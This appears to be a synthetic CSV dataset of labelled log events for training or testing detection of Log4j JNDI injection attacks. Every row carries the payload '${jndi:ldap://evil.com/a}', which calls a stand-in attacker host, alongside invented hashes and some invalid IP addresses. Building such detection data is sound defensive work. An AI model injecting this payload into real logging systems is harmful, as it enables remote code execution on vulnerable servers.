timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.024187,192.168.1.149,185.199.108.33,java.exe,025d1e634586d24558ed4e3ca421cce185cbad374c83eb0dc69545393a72a64c,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.92,log4j_attack
2025-11-28T06:19:56.024203,192.168.1.236,192.168.99.666,java.exe,8283ea22070fd84ecb09e681d3d6b16cae32113c0d29a32affe636cb3a1e366b,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.228,log4j_attack
2025-11-28T06:19:56.024218,192.168.1.150,104.21.45.67,java.exe,527c08d497f3439c92f39d0d12963ae0c43d6532222fba92074b8fb8986180ad,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.855,log4j_attack
2025-11-28T06:19:56.024233,192.168.1.148,185.199.108.33,java.exe,eb620018da90a3b8f69ac1d77cc404652b87fd7df88213efa5ace765eb5c9ea3,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.297,log4j_attack
2025-11-28T06:19:56.024248,192.168.1.55,45.32.123.99,java.exe,0e6f0a95a6f7291bb798f6af308bb87bdb82f0fd58a981b156d77de9c78254fb,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.933,log4j_attack
2025-11-28T06:19:56.024263,192.168.1.45,192.168.99.666,java.exe,3d43e45462c4fcb65ea13a16bcbfa6521291dffa1f2e14f44cb1dffa5e0950ee,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.933,log4j_attack
2025-11-28T06:19:56.024278,192.168.1.221,104.21.45.67,java.exe,876fd3c0280ce481c14d30a992a72ad56650f0615d97d948dc66729219d611cc,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.3,log4j_attack
2025-11-28T06:19:56.024293,192.168.1.48,192.168.99.666,java.exe,619f0cce258dcd23ddcaf46dac949cdb0c7211a18a8689e9a21e5da4d50909f2,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.024308,192.168.1.21,192.168.99.666,java.exe,4dd08a530ef19ee3ac1df13bb3b2cdf10ba4eb94cba7d45097a5026d65c62f1a,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.868,log4j_attack
2025-11-28T06:19:56.024323,192.168.1.84,185.199.108.33,java.exe,972e6ef7fe1bdb29d5ff141b12b836b68567f0ab0d9c4a0ed0ce1d4b9604c77b,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.911,log4j_attack
2025-11-28T06:19:56.024344,192.168.1.152,185.199.108.33,java.exe,bd9785bfd21ce04c876054bd572b1af75b860b61460bb966336035a4f731a6a9,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.949,log4j_attack
2025-11-28T06:19:56.024360,192.168.1.106,45.32.123.99,java.exe,af21232a340c6e1de43f282b879f607e4ed2e7c1a61c31d9e980029d36a5aa60,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.897,log4j_attack
2025-11-28T06:19:56.024375,192.168.1.11,104.21.45.67,java.exe,0deb738383ded784d7ea02fa39b079ea68dc68ec3fbe84a5a199ce65fe9a2f1d,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.831,log4j_attack
2025-11-28T06:19:56.024390,192.168.1.139,192.168.99.666,java.exe,ce7c93b20755750c5198286ab2f399d4f3a41a4d38eba406c3622d6d4aa04f68,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.332,log4j_attack
2025-11-28T06:19:56.024405,192.168.1.96,185.199.108.33,java.exe,75364a8b8a5c392056e6694efb82a1b39610b330d5720ddde3887b8dce529c72,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.902,log4j_attack
2025-11-28T06:19:56.024421,192.168.1.168,192.168.99.666,java.exe,7a0e2b153344492e5451a5e61ed4aa63dbbdb6f581de382ad78e32b8bc7a3b24,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.913,log4j_attack
2025-11-28T06:19:56.024436,192.168.1.94,192.168.99.666,java.exe,68ae72cdcdd19bd8a23e6a2d9990a29759a11d36c64f8f23a64bf32d05e1de1b,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.077,log4j_attack
2025-11-28T06:19:56.024451,192.168.1.20,104.21.45.67,java.exe,4f2d6d88adf48bf07372d3db55096b82f1a8d25da5528d14969fa9d5a31a7c0d,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.424,log4j_attack
2025-11-28T06:19:56.024466,192.168.1.97,45.32.123.99,java.exe,65505d0227987e3163b832859610731cb9b08c14243fc0ed6ece704107490e45,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.27,log4j_attack
2025-11-28T06:19:56.024481,192.168.1.10,45.32.123.99,java.exe,e04e29c385add50a710ec9c5c8462a200bc17e7b66478dd786f3bf26e9f1249d,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.853,log4j_attack
2025-11-28T06:19:56.024496,192.168.1.75,104.21.45.67,java.exe,33d7989bc9a736542c10c451900bca344295b35af3d19b7d8907d7e96a1315bb,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.904,log4j_attack
2025-11-28T06:19:56.024511,192.168.1.80,192.168.99.666,java.exe,4d2d032499af75395378c2781ddb9e18a5c7f07ff2ed778bd1e32188e90cf995,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.931,log4j_attack
2025-11-28T06:19:56.024526,192.168.1.144,192.168.99.666,java.exe,aa273434edbc942e46c227cfb7f90916cfe8d605441bcec8acadf605b08f13c4,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.021,log4j_attack
2025-11-28T06:19:56.024541,192.168.1.12,192.168.99.666,java.exe,d02be6032ec09508841a87564f0633a54013c7cec63f4cecf17654177b4199dd,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.298,log4j_attack
2025-11-28T06:19:56.024556,192.168.1.157,192.168.99.666,java.exe,57d68a32f724fb63984b59d92facf3ec51cf6b6366ea35e8f11a4678e306ae59,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.003,log4j_attack
2025-11-28T06:19:56.024572,192.168.1.186,185.45.67.88,java.exe,f8f4abfdb8728695ad2c06abd94ebab2948a22afe3aa8876e14c1c3276eec5ee,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.391,log4j_attack
2025-11-28T06:19:56.024587,192.168.1.27,104.21.45.67,java.exe,d02bd9f58afed66b0964a28959be32d38335e68183acd15ae35f83779c19e5a3,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.427,log4j_attack
2025-11-28T06:19:56.024601,192.168.1.70,192.168.99.666,java.exe,0691c8eddab27d896f49dfb7de03e87f5c8b8f6f8d7412d56aa1cc53e0da83b7,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.807,log4j_attack
2025-11-28T06:19:56.024617,192.168.1.228,45.32.123.99,java.exe,f1dea86d31f7a974a04561ec6fc762c458eae9f2c2f04ca831008ffd29ea80f7,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.878,log4j_attack
2025-11-28T06:19:56.024633,192.168.1.86,185.199.108.33,java.exe,8ab94719885319312d6c41566d5e18598713da89bdf81b4c96d8d980e6fedff5,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.968,log4j_attack
2025-11-28T06:19:56.024648,192.168.1.150,104.21.45.67,java.exe,0e8c7770d74189ca208059ea044802cb55c60ffe2bf861bf6caefa35e746a4c8,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.921,log4j_attack
2025-11-28T06:19:56.024663,192.168.1.24,45.32.123.99,java.exe,131039f6d80f515c0be23d67eef003366ef7d074e8bab5f9e2dcd040e9fa90ff,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.159,log4j_attack
2025-11-28T06:19:56.024678,192.168.1.167,185.45.67.88,java.exe,6c36475a909cf6b3b2c2a2282dc3b2521139bc70fbe076661071adbf86f99fc6,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.252,log4j_attack
2025-11-28T06:19:56.024693,192.168.1.245,45.32.123.99,java.exe,7030842db85eff290caaaf935ebafc209ee4adad0a8cc0cbe26ed657103af119,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.157,log4j_attack
2025-11-28T06:19:56.024708,192.168.1.59,104.21.45.67,java.exe,ee57f318d65d4d3caa3289a9eafd54d8e478a06a086168afd656de412643a3d0,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.352,log4j_attack
2025-11-28T06:19:56.024723,192.168.1.189,185.199.108.33,java.exe,6e2adba0cb5d3ea9b43b3151e5b7e824cda6acc54736bd7bb5a8fc13855cfca4,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.296,log4j_attack
2025-11-28T06:19:56.024740,192.168.1.73,185.199.108.33,java.exe,0d1690e809037fbbeb0ed1f859005d908a8192f4e1fb870af05da627fd2b868e,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.968,log4j_attack
2025-11-28T06:19:56.024755,192.168.1.114,185.45.67.88,java.exe,b14fde96ef3dbb016ddd92957cb6dbcaed9b633e5908baf0e34c190dd77f4d33,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.121,log4j_attack
2025-11-28T06:19:56.024770,192.168.1.170,185.45.67.88,java.exe,34508931e52d4121b2957a62243b9e30010c55d886e00b33aa9bfdaeb4d5ac71,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.364,log4j_attack
2025-11-28T06:19:56.024785,192.168.1.250,104.21.45.67,java.exe,246248a0a260a352fa046f562948ff2ff83bb8b4e73f97ef350bc21619765124,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.959,log4j_attack
2025-11-28T06:19:56.024800,192.168.1.244,192.168.99.666,java.exe,7426bdd82823b1a0b1c33576c41257bd4ca7633208830f534c48de4870b27574,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.937,log4j_attack
2025-11-28T06:19:56.024815,192.168.1.221,104.21.45.67,java.exe,13e03d20434105cfbe7bda56ca578ed5d9add99947420330878c55d43af35ec1,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.981,log4j_attack
2025-11-28T06:19:56.024830,192.168.1.244,185.199.108.33,java.exe,09d6e4dd2d438cd0ac0ccfdc3b60d20e50a66391a19df5e42f3f34eeb6cbbad4,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.332,log4j_attack
2025-11-28T06:19:56.024845,192.168.1.145,192.168.99.666,java.exe,5d72d0033b8ede29fc324cc96ce285aff410c2581a96791c9409db255632087c,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.985,log4j_attack
2025-11-28T06:19:56.024860,192.168.1.193,45.32.123.99,java.exe,6add1dafdaf34cbd3abec66994a90f30c652b19b0295df9d73a2423c53f491c6,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.29,log4j_attack
2025-11-28T06:19:56.024875,192.168.1.170,104.21.45.67,java.exe,697ea706d4a75d6479b080bbde6681332747292eae7351b137f152995a34fac4,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.432,log4j_attack
2025-11-28T06:19:56.024915,192.168.1.127,192.168.99.666,java.exe,fd0d488c278959afe805d00d4b3739f2a05e9b9e0004b0e6e762d14a572c92de,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.963,log4j_attack
2025-11-28T06:19:56.024931,192.168.1.244,45.32.123.99,java.exe,e283a5af544fa607fc2f16210db35af77d467eb38ee9add13ab2d2774a044382,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.476,log4j_attack
2025-11-28T06:19:56.024946,192.168.1.246,185.199.108.33,java.exe,8351a83ac4278f6625a1e9c4633385988d5450f95f55262e3cec8f3f443551c3,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.48,log4j_attack
2025-11-28T06:19:56.024961,192.168.1.33,185.45.67.88,java.exe,d927ca50cd91bd03f158ee501021db3be6de96984a6072f0e981a7397ac40e22,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.851,log4j_attack
2025-11-28T06:19:56.024975,192.168.1.151,192.168.99.666,java.exe,c8f716624ab210b58248038ed6c6a90c7e85f25938588df355894a985949c8b7,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.912,log4j_attack
2025-11-28T06:19:56.024991,192.168.1.195,185.45.67.88,java.exe,5dcab7c80d47d49589e0ab323357d5ca8ef086486b1b7d74cf673f1b4ee49d9e,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.348,log4j_attack
2025-11-28T06:19:56.025006,192.168.1.211,185.199.108.33,java.exe,0d042be1b6c66f96134b74c34c341e6532fbc897aea66142846fdff73ae78e1a,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.918,log4j_attack
2025-11-28T06:19:56.025022,192.168.1.138,192.168.99.666,java.exe,51b52ccaaceb49ca0b2c8af16356e5072073cb33f9b0068c0a50bca3c554bda4,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.845,log4j_attack
2025-11-28T06:19:56.025037,192.168.1.154,104.21.45.67,java.exe,91fe3cda0bb80ea90998d288b040dd7fce3b52f687cc12de24cf0736ddb6dbdc,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.97,log4j_attack
2025-11-28T06:19:56.025051,192.168.1.175,104.21.45.67,java.exe,40b35a40da2b1905112a6794bf4e96340084bba293957a69a2e3a7fa72815952,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.17,log4j_attack
2025-11-28T06:19:56.025066,192.168.1.158,185.45.67.88,java.exe,b79f78b7b0440a2178f82f03d535e2c800b1c09419de24a0a1520c6133402ceb,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.124,log4j_attack
2025-11-28T06:19:56.025081,192.168.1.197,185.45.67.88,java.exe,da9ca1b10317c9f6a82c19efce2600f579012c5c9616209c1cbca56dc60a17af,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.224,log4j_attack
2025-11-28T06:19:56.025096,192.168.1.20,104.21.45.67,java.exe,b59c74aae2ce73f12ffdd78726c50315746ada094bb4ccf3b452bcb00aa81349,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.087,log4j_attack
2025-11-28T06:19:56.025111,192.168.1.182,185.199.108.33,java.exe,0e8a3d693cbf3221f24591f32d4975a848d072b7c1fb738ff80218c6c46263e5,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.31,log4j_attack
2025-11-28T06:19:56.025126,192.168.1.75,185.199.108.33,java.exe,5c7cb734f0ceda089133da0dc699dd00d8f055c2676cc29e557bce23dc2c50d3,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.304,log4j_attack
2025-11-28T06:19:56.025141,192.168.1.119,185.45.67.88,java.exe,3e8a4bcfab986e60d4a38f80f1973910fc25a16349912f886095d176d855f104,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.223,log4j_attack
2025-11-28T06:19:56.025156,192.168.1.229,185.45.67.88,java.exe,eca6d25c4395caaaec9129a502f7075bab6968740f43320692ecf64678d38b3d,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.992,log4j_attack
2025-11-28T06:19:56.025171,192.168.1.36,185.45.67.88,java.exe,fb21bb37981c63c457b8f9fef527c112f803b0151d6e6836a91f73d47083b90f,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.06,log4j_attack
2025-11-28T06:19:56.025186,192.168.1.87,185.45.67.88,java.exe,3af83e5ffcb742cf13e84a0a856db8f86113efd9b5551fecbc8f98263846db43,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.247,log4j_attack
2025-11-28T06:19:56.025201,192.168.1.11,185.199.108.33,java.exe,6952f71ae493151f110d3a79076987bc3ed0b4671e68baf218525fd51d552aca,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.27,log4j_attack
2025-11-28T06:19:56.025216,192.168.1.177,185.45.67.88,java.exe,27e7c1423ee4d369aa3db342995d00042ea256a5879b3c8b028b0274f5b82369,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.027,log4j_attack
2025-11-28T06:19:56.025231,192.168.1.139,192.168.99.666,java.exe,1803c579f8645f1502d37ab0a67f22323ed2fd3adb1f76a122f15691d6b23430,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.833,log4j_attack
2025-11-28T06:19:56.025246,192.168.1.245,192.168.99.666,java.exe,975d463b1b39ab9a450008b470bda441d9c4e9fcd7c302fed63ac83c5873c497,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.314,log4j_attack
2025-11-28T06:19:56.025261,192.168.1.113,185.199.108.33,java.exe,3a753b33578e26283f4868a8807372343b95d4a93b755bd429baaa1ec4bd502d,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.393,log4j_attack
2025-11-28T06:19:56.025276,192.168.1.105,104.21.45.67,java.exe,99342d99ce395f7c07652e60a7e7eb6b8ed5ec7c25f9de5ebaea53b0efb6141e,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.452,log4j_attack
2025-11-28T06:19:56.025292,192.168.1.100,192.168.99.666,java.exe,cc0209fbe5079737023bef7277467f856d0a82309e64ee798d2cfff36ae8ead1,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.841,log4j_attack
2025-11-28T06:19:56.025307,192.168.1.120,192.168.99.666,java.exe,af38610265407c524d4bbe4b6e4fa1bb058c07bdf73d68164ddd01f76de88a92,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.954,log4j_attack
2025-11-28T06:19:56.025322,192.168.1.19,192.168.99.666,java.exe,1a9e77630464d2e26a3a19a0bd8244ba5439bd4ef581f1769f11f052e5ec4764,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.076,log4j_attack
2025-11-28T06:19:56.025344,192.168.1.151,104.21.45.67,java.exe,eeefb058256615be7c19a2b35c2bcd50645f0cc17b4c97c54c19539fb7968434,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.97,log4j_attack
2025-11-28T06:19:56.025359,192.168.1.19,192.168.99.666,java.exe,880bd0b8c466a3c0fa64bcc225713e8d9bd9f8c45ad2b89306d41bbfc068768d,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.215,log4j_attack
2025-11-28T06:19:56.025374,192.168.1.188,185.45.67.88,java.exe,f1024c9dee0bf18df5185b21fbb64668e994f0831c4ce092928c1271e555d0b0,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.069,log4j_attack
2025-11-28T06:19:56.025389,192.168.1.101,185.45.67.88,java.exe,45c9456519fd17abd3935bcadd292742f3110c1ddd884bc77014b45f1d7c6936,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.972,log4j_attack
2025-11-28T06:19:56.025404,192.168.1.37,185.45.67.88,java.exe,c02b33386e98fa0df048fa404e881d5409b80135fba5d9c496eaed178b5944d4,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.875,log4j_attack
2025-11-28T06:19:56.025419,192.168.1.191,185.199.108.33,java.exe,ce539e787ee430399f371a2ad5099a3d43a4e1c15b15e01525b7771f01ddcb74,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.103,log4j_attack
2025-11-28T06:19:56.025434,192.168.1.174,185.45.67.88,java.exe,353486ed99e35af4c77459a25fff5ec331436a814f365edf14dd387de191de87,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.883,log4j_attack
2025-11-28T06:19:56.025449,192.168.1.124,192.168.99.666,java.exe,b07200381faeaa23fc03df59c383492b49a8660a270bd790baf997ebff969971,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.823,log4j_attack
2025-11-28T06:19:56.025464,192.168.1.168,185.45.67.88,java.exe,b35b2b99cc4180ff2465687e99a57f79002f22c86c65bbbfe8adc93147c24bed,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.408,log4j_attack
2025-11-28T06:19:56.025479,192.168.1.21,185.199.108.33,java.exe,521a5987c61e136778cdfb13b778f38f96ee29ac20fa65b3a57e392daf23cc05,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.415,log4j_attack
2025-11-28T06:19:56.025494,192.168.1.199,104.21.45.67,java.exe,b5cb9913d389d8d86bf740e375ee6338209b79da16a0a27c722f4989482bc336,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.363,log4j_attack
2025-11-28T06:19:56.025509,192.168.1.18,185.199.108.33,java.exe,bc04eeb9086d102b7cce8b301aa1d9e2de2a80805b80880584b12ae6cc40dfd5,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.25,log4j_attack
2025-11-28T06:19:56.025524,192.168.1.56,45.32.123.99,java.exe,5fe923671a733ccf70bc228ae6426cf7151c11a928bca68f82abb9044e7f3db7,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.038,log4j_attack
2025-11-28T06:19:56.025540,192.168.1.171,192.168.99.666,java.exe,142b37e3f0098bbac589128170bd130423eb858520a0ad31e5a42f57691d98c9,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.473,log4j_attack
2025-11-28T06:19:56.025555,192.168.1.237,192.168.99.666,java.exe,9732ba513cee3f0aa70ef7e1123d00ecafaf87f6638848c0c1959c853194a49a,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.461,log4j_attack
2025-11-28T06:19:56.025570,192.168.1.108,185.199.108.33,java.exe,77eb48e7713caf6db3df5a1a0977e51a360ef291b2bc8404a22d4cfe7df536ba,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.457,log4j_attack
2025-11-28T06:19:56.025585,192.168.1.241,192.168.99.666,java.exe,0422bcdf5a4b5035b5460c4ff3a7e9ac17e3f4db810c393ddca8b6a481a0701a,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.188,log4j_attack
2025-11-28T06:19:56.025600,192.168.1.172,45.32.123.99,java.exe,afaec86f1f6c7e786bccf1957911b2dc01f4a6c0762087839a84d89980d8bbd6,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.22,log4j_attack
2025-11-28T06:19:56.025615,192.168.1.245,185.45.67.88,java.exe,f23ee97f5e461f6f0a47221ed31d5e34583af46f498dd7c4182818e128e61056,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.294,log4j_attack
2025-11-28T06:19:56.025630,192.168.1.33,185.45.67.88,java.exe,79c08258785abff821ec0060e29e809cd556eedd5a369f7a21425258d805f4a5,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.087,log4j_attack
2025-11-28T06:19:56.025645,192.168.1.104,192.168.99.666,java.exe,6db50ef18614acbcba1e7571be2303f6e7a08fbddbf91587ed19dbe234dff965,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.964,log4j_attack
2025-11-28T06:19:56.025660,192.168.1.48,104.21.45.67,java.exe,38390f6cf2e90581a55fc5b19d36d6892cd145fbe8ca86388aa03e6db4898cc8,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.48,log4j_attack
2025-11-28T06:19:56.025675,192.168.1.24,185.45.67.88,java.exe,4efc24008c2ae2b67caeffea10001187a19fd55c6a3fa0569ff563bf8d144c35,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.892,log4j_attack
2025-11-28T06:19:56.025690,192.168.1.65,185.45.67.88,java.exe,fdb5c51b20ecca5afb321e688a79c2865fddd2c1f676ade24bf1e8ba72e64b4b,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.942,log4j_attack
2025-11-28T06:19:56.025705,192.168.1.156,104.21.45.67,java.exe,73b085c87a6af315bd930315bcdb88a69bd8e4f9b37a08c186348706708db1cc,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.4,log4j_attack
2025-11-28T06:19:56.025720,192.168.1.39,185.45.67.88,java.exe,cb6ff3b32e779c275ceb67efbbb91e64fdea96809ace17a791dc5e581a8b7ad0,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.463,log4j_attack
2025-11-28T06:19:56.025734,192.168.1.219,185.45.67.88,java.exe,354e5baa20e7587f290f148bc604b39642c7954a3dc22677fb43e7da5f9c18eb,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.491,log4j_attack
2025-11-28T06:19:56.025750,192.168.1.205,104.21.45.67,java.exe,6dd990875a365c317e233cc526d08d87f9c1f05e6fcc6e8dfd14bbc691f7108a,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.157,log4j_attack
2025-11-28T06:19:56.025764,192.168.1.23,104.21.45.67,java.exe,ac9337db3798458be3dc5064db103321ee1f01b566fa048000db6c14a65fae9b,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.497,log4j_attack
2025-11-28T06:19:56.025779,192.168.1.42,185.199.108.33,java.exe,e163c8d64c7494cf22cbcbf26f6e5b12f41965d2921232d5c61f22ffd12cba16,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.009,log4j_attack
2025-11-28T06:19:56.025794,192.168.1.85,185.45.67.88,java.exe,c39bb5e725ffa5c6e3af12c904b8a49dec0c9ce989f45839aafe934266c2f653,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.485,log4j_attack
2025-11-28T06:19:56.025809,192.168.1.242,45.32.123.99,java.exe,d57526166d6167aea22a0a6c68fcf8f2fd40d282662e252f164220a1cc77f534,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.431,log4j_attack
2025-11-28T06:19:56.025824,192.168.1.222,185.199.108.33,java.exe,7166df493f8657c19c83505c2c8e4f0fef20c6854912a5b1328ac534c3e7f6d3,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.046,log4j_attack
2025-11-28T06:19:56.025839,192.168.1.32,45.32.123.99,java.exe,3ee59c679753a440282f0d11652d50f9a42c672559ad28669f48eacad0947304,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.943,log4j_attack
2025-11-28T06:19:56.025854,192.168.1.29,185.199.108.33,java.exe,ce79dcb943fb1dc4aac48dba55b164e756bc205e335f047ea48d9c29a635e32d,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.858,log4j_attack
2025-11-28T06:19:56.025869,192.168.1.33,185.199.108.33,java.exe,e18d1d79f56fe281a036797cdabd948fc33c2d2ddb8d30e1e4324ff149270179,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.303,log4j_attack
2025-11-28T06:19:56.025883,192.168.1.191,185.45.67.88,java.exe,c5a35b99180a65d1a7299bb65bc756376dcdac27c9ceb47ab56f9698c833564b,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.418,log4j_attack
